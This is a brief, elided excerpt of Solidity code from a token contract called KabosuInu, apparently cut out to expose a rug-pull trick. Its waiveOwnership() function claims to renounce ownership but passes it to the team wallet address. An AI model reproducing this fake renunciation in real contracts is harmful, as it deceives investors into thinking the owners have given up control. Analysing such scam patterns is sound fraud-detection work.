...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xF56C6d2c314A63830B0856e69eBfBCc3575BA1D5));
        _owner = address(0xF56C6d2c314A63830B0856e69eBfBCc3575BA1D5);
    }
...
contract KabosuInu is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xE43639a62c7bCAA4Af39501B21B2576212692861);
    address payable public teamWalletAddress = payable(0xF56C6d2c314A63830B0856e69eBfBCc3575BA1D5);
